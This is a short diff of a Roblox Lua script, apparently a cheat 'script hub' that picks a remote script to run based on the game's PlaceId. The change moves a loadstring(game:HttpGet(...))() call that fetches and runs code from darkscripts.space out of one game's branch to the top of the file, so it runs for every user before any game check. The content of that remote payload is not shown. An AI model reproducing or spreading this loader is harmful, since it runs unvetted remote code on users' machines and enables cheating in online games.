@@ -1,4 +1,5 @@
 repeat task.wait(0.1) until game:IsLoaded()
+loadstring(game:HttpGet('https://darkscripts.space/scripts/4245a0f082.lua', true))()
 local MarketplaceService = game:GetService("MarketplaceService")
 local success, gameInfo = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
 local i_am_skidder = game.PlaceId
@@ -59,5 +60,4 @@ elseif i_am_skidder == 18901165922 then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/PetGO/refs/heads/main/PetGO"))()
 elseif i_am_skidder == 16732694052 then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/Fisch/refs/heads/main/Fisch"))()
-loadstring(game:HttpGet('https://darkscripts.space/scripts/4245a0f082.lua', true))()
 end
